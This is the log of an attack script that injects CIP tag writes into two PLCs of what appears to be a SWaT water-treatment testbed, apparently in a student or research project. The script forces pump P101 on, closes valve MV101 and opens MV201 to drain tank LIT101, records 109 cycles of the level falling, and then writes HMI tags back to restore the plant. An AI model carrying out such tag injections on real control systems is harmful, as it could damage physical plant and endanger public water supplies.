# phase1
# Command: /home/ubuntu/Desktop/Group 2/swat-cps-project/.venv/bin/python3 /home/ubuntu/Desktop/Group 2/swat-cps-project/scripts/attack/phase1_inject.py --plc-ip 192.168.1.10 --duration 120
# Started: 2026-04-10 17:23:34

============================================================
[LOG] Writing to /home/ubuntu/Desktop/Group 2/swat-cps-project/scripts/attack/../../logs/phase1_20260410_172334.log
[2026-04-10 17:23:34]   SWaT Phase 1 — Direct CIP Tag Injection
[2026-04-10 17:23:34]   PLC1: 192.168.1.10   PLC2: 192.168.1.20
[2026-04-10 17:23:34]   Duration: 120s
[2026-04-10 17:23:34]   Started: 2026-04-10 17:23:34
============================================================
[*] PLC1 connected. LIT101=529.2mm
[*] PLC2 connected. MV201.Cmd=1

[2026-04-10 17:23:34] [ATTACK] Duration=120s
[2026-04-10 17:23:34] [ATTACK] PLC1: P101=ON, MV101=CLOSED
[2026-04-10 17:23:34] [ATTACK] PLC2: MV201=OPEN
[2026-04-10 17:23:34] [ATTACK] LIT101 will drain to LL (250mm)

[17:23:34] cycle=   1  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=529.2mm  FIT101=-28.000L/s  [119s left]
[17:23:35] cycle=   2  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=529.2mm  FIT101=-28.000L/s  [118s left]
[17:23:36] cycle=   3  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=529.0mm  FIT101=-28.000L/s  [117s left]
[17:23:37] cycle=   4  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [116s left]
[17:23:38] cycle=   5  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [115s left]
[17:23:39] cycle=   6  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [114s left]
[17:23:41] cycle=   7  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [113s left]
[17:23:42] cycle=   8  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [112s left]
[17:23:43] cycle=   9  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [110s left]
[17:23:44] cycle=  10  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [109s left]
[17:23:45] cycle=  11  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [108s left]
[17:23:46] cycle=  12  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [107s left]
[17:23:47] cycle=  13  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [106s left]
[17:23:48] cycle=  14  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [105s left]
[17:23:49] cycle=  15  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [104s left]
[17:23:50] cycle=  16  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [103s left]
[17:23:52] cycle=  17  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [102s left]
[17:23:53] cycle=  18  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [101s left]
[17:23:54] cycle=  19  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=528.9mm  FIT101=-28.000L/s  [99s left]
[17:23:55] cycle=  20  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=525.9mm  FIT101=-28.000L/s  [98s left]
[17:23:56] cycle=  21  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=524.8mm  FIT101=-28.000L/s  [97s left]
[17:23:57] cycle=  22  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=524.5mm  FIT101=-28.000L/s  [96s left]
[17:23:58] cycle=  23  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=524.5mm  FIT101=-28.000L/s  [95s left]
[17:23:59] cycle=  24  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=524.5mm  FIT101=-28.000L/s  [94s left]
[17:24:00] cycle=  25  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=524.5mm  FIT101=-28.000L/s  [93s left]
[17:24:02] cycle=  26  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=521.4mm  FIT101=-28.000L/s  [92s left]
[17:24:03] cycle=  27  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=520.6mm  FIT101=-28.000L/s  [91s left]
[17:24:04] cycle=  28  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=520.1mm  FIT101=-28.000L/s  [89s left]
[17:24:05] cycle=  29  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=520.1mm  FIT101=-28.000L/s  [88s left]
[17:24:06] cycle=  30  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=520.1mm  FIT101=-28.000L/s  [87s left]
[17:24:07] cycle=  31  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=519.5mm  FIT101=-28.000L/s  [86s left]
[17:24:08] cycle=  32  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=519.5mm  FIT101=-28.000L/s  [85s left]
[17:24:09] cycle=  33  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=519.5mm  FIT101=-28.000L/s  [84s left]
[17:24:10] cycle=  34  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=516.6mm  FIT101=-28.000L/s  [83s left]
[17:24:11] cycle=  35  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=516.4mm  FIT101=-28.000L/s  [82s left]
[17:24:13] cycle=  36  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=515.0mm  FIT101=-28.000L/s  [81s left]
[17:24:14] cycle=  37  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=515.0mm  FIT101=-28.000L/s  [79s left]
[17:24:15] cycle=  38  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=515.0mm  FIT101=-28.000L/s  [78s left]
[17:24:16] cycle=  39  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=513.7mm  FIT101=-28.000L/s  [77s left]
[17:24:17] cycle=  40  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=513.1mm  FIT101=-28.000L/s  [76s left]
[17:24:18] cycle=  41  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=513.1mm  FIT101=-28.000L/s  [75s left]
[17:24:19] cycle=  42  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=511.1mm  FIT101=-28.000L/s  [74s left]
[17:24:20] cycle=  43  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=510.9mm  FIT101=-28.000L/s  [73s left]
[17:24:21] cycle=  44  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.8mm  FIT101=-28.000L/s  [72s left]
[17:24:23] cycle=  45  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.8mm  FIT101=-28.000L/s  [71s left]
[17:24:24] cycle=  46  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.2mm  FIT101=-28.000L/s  [70s left]
[17:24:25] cycle=  47  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.2mm  FIT101=-28.000L/s  [68s left]
[17:24:26] cycle=  48  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.8mm  FIT101=-28.000L/s  [67s left]
[17:24:27] cycle=  49  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=509.0mm  FIT101=-28.000L/s  [66s left]
[17:24:28] cycle=  50  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=509.0mm  FIT101=-28.000L/s  [65s left]
[17:24:29] cycle=  51  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=508.4mm  FIT101=-28.000L/s  [64s left]
[17:24:30] cycle=  52  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=506.4mm  FIT101=-28.000L/s  [63s left]
[17:24:31] cycle=  53  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=506.2mm  FIT101=-28.000L/s  [62s left]
[17:24:33] cycle=  54  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=505.5mm  FIT101=-28.000L/s  [61s left]
[17:24:34] cycle=  55  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=503.3mm  FIT101=-28.000L/s  [60s left]
[17:24:35] cycle=  56  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=502.7mm  FIT101=-28.000L/s  [58s left]
[17:24:36] cycle=  57  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=502.7mm  FIT101=-28.000L/s  [57s left]
[17:24:37] cycle=  58  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=501.0mm  FIT101=-28.000L/s  [56s left]
[17:24:38] cycle=  59  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=501.0mm  FIT101=-28.000L/s  [55s left]
[17:24:39] cycle=  60  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=499.9mm  FIT101=-28.000L/s  [54s left]
[17:24:40] cycle=  61  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=499.6mm  FIT101=-28.000L/s  [53s left]
[17:24:41] cycle=  62  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=498.8mm  FIT101=-28.000L/s  [52s left]
[17:24:42] cycle=  63  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=498.2mm  FIT101=-28.000L/s  [51s left]
[17:24:44] cycle=  64  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=495.8mm  FIT101=-28.000L/s  [50s left]
[17:24:45] cycle=  65  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=495.8mm  FIT101=-28.000L/s  [49s left]
[17:24:46] cycle=  66  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=494.9mm  FIT101=-28.000L/s  [47s left]
[17:24:47] cycle=  67  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=494.8mm  FIT101=-28.000L/s  [46s left]
[17:24:48] cycle=  68  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=494.2mm  FIT101=-28.000L/s  [45s left]
[17:24:49] cycle=  69  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=494.2mm  FIT101=-28.000L/s  [44s left]
[17:24:50] cycle=  70  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=492.4mm  FIT101=-28.000L/s  [43s left]
[17:24:51] cycle=  71  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=492.4mm  FIT101=-28.000L/s  [42s left]
[17:24:52] cycle=  72  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=491.9mm  FIT101=-28.000L/s  [41s left]
[17:24:54] cycle=  73  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=491.9mm  FIT101=-28.000L/s  [40s left]
[17:24:55] cycle=  74  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=489.6mm  FIT101=-28.000L/s  [39s left]
[17:24:56] cycle=  75  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=489.2mm  FIT101=-28.000L/s  [37s left]
[17:24:57] cycle=  76  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=488.1mm  FIT101=-28.000L/s  [36s left]
[17:24:58] cycle=  77  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=488.1mm  FIT101=-28.000L/s  [35s left]
[17:24:59] cycle=  78  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=488.0mm  FIT101=-28.000L/s  [34s left]
[17:25:00] cycle=  79  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=487.8mm  FIT101=-28.000L/s  [33s left]
[17:25:01] cycle=  80  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=485.8mm  FIT101=-28.000L/s  [32s left]
[17:25:02] cycle=  81  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=485.6mm  FIT101=-28.000L/s  [31s left]
[17:25:03] cycle=  82  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=484.4mm  FIT101=-28.000L/s  [30s left]
[17:25:05] cycle=  83  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=484.0mm  FIT101=-28.000L/s  [29s left]
[17:25:06] cycle=  84  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=483.4mm  FIT101=-28.000L/s  [28s left]
[17:25:07] cycle=  85  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=483.0mm  FIT101=-28.000L/s  [26s left]
[17:25:08] cycle=  86  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=483.0mm  FIT101=-28.000L/s  [25s left]
[17:25:09] cycle=  87  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=483.0mm  FIT101=-28.000L/s  [24s left]
[17:25:10] cycle=  88  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=480.5mm  FIT101=-28.000L/s  [23s left]
[17:25:11] cycle=  89  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=480.2mm  FIT101=-28.000L/s  [22s left]
[17:25:12] cycle=  90  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=479.7mm  FIT101=-31.000L/s  [21s left]
[17:25:13] cycle=  91  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=479.2mm  FIT101=-31.000L/s  [20s left]
[17:25:15] cycle=  92  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=479.2mm  FIT101=-31.000L/s  [19s left]
[17:25:16] cycle=  93  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=479.0mm  FIT101=-31.000L/s  [18s left]
[17:25:17] cycle=  94  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=477.2mm  FIT101=-31.000L/s  [16s left]
[17:25:18] cycle=  95  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=477.0mm  FIT101=-31.000L/s  [15s left]
[17:25:19] cycle=  96  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=477.0mm  FIT101=-31.000L/s  [14s left]
[17:25:20] cycle=  97  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=476.6mm  FIT101=-31.000L/s  [13s left]
[17:25:21] cycle=  98  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=475.3mm  FIT101=-31.000L/s  [12s left]
[17:25:22] cycle=  99  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=475.1mm  FIT101=-31.000L/s  [11s left]
[17:25:23] cycle= 100  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=475.0mm  FIT101=-31.000L/s  [10s left]
[17:25:25] cycle= 101  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=474.4mm  FIT101=-28.000L/s  [9s left]
[17:25:26] cycle= 102  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=474.3mm  FIT101=-28.000L/s  [8s left]
[17:25:27] cycle= 103  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=474.1mm  FIT101=-28.000L/s  [6s left]
[17:25:28] cycle= 104  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=471.2mm  FIT101=-28.000L/s  [5s left]
[17:25:29] cycle= 105  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=471.2mm  FIT101=-28.000L/s  [4s left]
[17:25:30] cycle= 106  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=470.1mm  FIT101=-28.000L/s  [3s left]
[17:25:31] cycle= 107  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=469.8mm  FIT101=-28.000L/s  [2s left]
[17:25:32] cycle= 108  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=469.5mm  FIT101=-28.000L/s  [1s left]
[17:25:33] cycle= 109  MV101=CLOSED  MV201=OPEN  P101=ON(manual)  LIT101=469.5mm  FIT101=-28.000L/s  [0s left]
[2026-04-10 17:25:34] 
[RESTORE] Restoring safe state...
[2026-04-10 17:25:34]     PLC1  HMI_MV101.Auto            = False  [Success]
[2026-04-10 17:25:34]     PLC1  HMI_MV101.Cmd             = 2  [Success]
[2026-04-10 17:25:34]     PLC1  HMI_MV101.Auto            = True  [Success]
[2026-04-10 17:25:34]     PLC1  HMI_P101.Auto             = False  [Success]
[2026-04-10 17:25:34]     PLC1  HMI_P101.Cmd              = 2  [Success]
[2026-04-10 17:25:35]     PLC1  HMI_P101.Auto             = True  [Success]
[2026-04-10 17:25:35]     PLC2  HMI_MV201.Auto            = False  [Success]
[2026-04-10 17:25:35]     PLC2  HMI_MV201.Cmd             = 1  [Success]
[2026-04-10 17:25:35]     PLC2  HMI_MV201.Auto            = True  [Success]
[2026-04-10 17:25:36] 
[RESTORE] MV101=CLOSED  MV201=OPEN  P101.Auto=True  LIT101=466.5mm
[2026-04-10 17:25:36] [RESTORE] Done.
[2026-04-10 17:25:36] [+] Phase 1 complete.
